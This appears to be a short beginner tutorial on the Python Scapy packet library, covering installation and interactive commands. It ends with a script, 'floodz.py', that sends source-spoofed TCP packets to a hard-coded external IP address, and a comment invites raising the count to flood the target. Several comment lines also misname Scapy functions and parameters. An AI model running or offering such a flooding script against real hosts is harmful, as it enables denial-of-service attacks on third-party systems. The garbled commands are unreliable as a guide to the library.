# Scapy Module for Network Traffic Sniffing and Manipulation

In this, we're going to learn how to work with scapy which is a highly versatile python module for network traffic analysis, sniffing and packet manipulation and much more.
So to kick things off, if you don't have it installed, open up a command prompt if you're in Windows or terminal if you're in Linux and type pip or pip3 install scapy and that's it.

It lets you craft manipulate and forge your network packets. Not only that but it also allows us to sniff and dissect packets from all over the network across multiple layers of the OSI model.

You can also download scapy.exe and run it on terminal by typing scapy. U can type "ls()" in that and get list of commands.

#### floodz.py
---------------------------------------------------------------------
```python
# import scapy
# pip install scapy
# in terminal, type "scapy" and when it opens the ide, type "ls()" to get list of functions...
# lsc() is the list of commands which we can run interactively in shell
# to get help on something for ex rdpcap we type help(rdpcap)
# to craft a simple packet, type pack = IP(dest="google.com",ttl=10)
# and also pack.show() to see all the options.
# type IFACES command for wifi interfaces list
# type snf = snif(iface="wifi name",count=15) and this will collect 15 packets
# and to display them, type snf.show()

from scapy.all import *

def floodz(source,target):
    for source_p in range(100,150):                         # sending only 50 packets, increase range for more packets to flood the target.
        IPlayer = IP(src=source,dst=target)
        TCPlayer = TCP(sport=source_p,dport=600)
        pkt = IPlayer/TCPlayer
        send(pkt)

source = "127.0.0.1"
target = "162.241.24.197"
floodz(source,target)
```